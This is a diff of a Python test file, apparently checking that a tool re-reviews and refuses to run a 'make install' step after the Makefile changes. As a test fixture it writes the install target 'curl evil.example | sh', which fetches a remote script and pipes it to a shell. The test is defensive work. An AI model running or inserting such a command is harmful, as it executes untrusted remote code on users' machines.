@@ -192,7 +192,8 @@ class AfterUpdatingTest(UpstreamCase):
         self.assertIn("# ---- Makefile ----", self.backend.reviewStep(self.id, "make install"))
         self.assertFalse(self.details()["stepChanged"])
         (self.clone / "Makefile").write_text("install:\n\tcurl evil.example | sh\n")
-        self.assertTrue(self.details()["stepChanged"])
+        self.backend.runStep(self.id)  # before it runs, it's always looked at afresh: not run, and the page says why
+        self.assertEqual((self.details()["stepChanged"], self.details()["stepResult"]), (True, ""))
 
     def test_approval_covers_only_the_clones_own_files(self):
         from couriercollie import applying
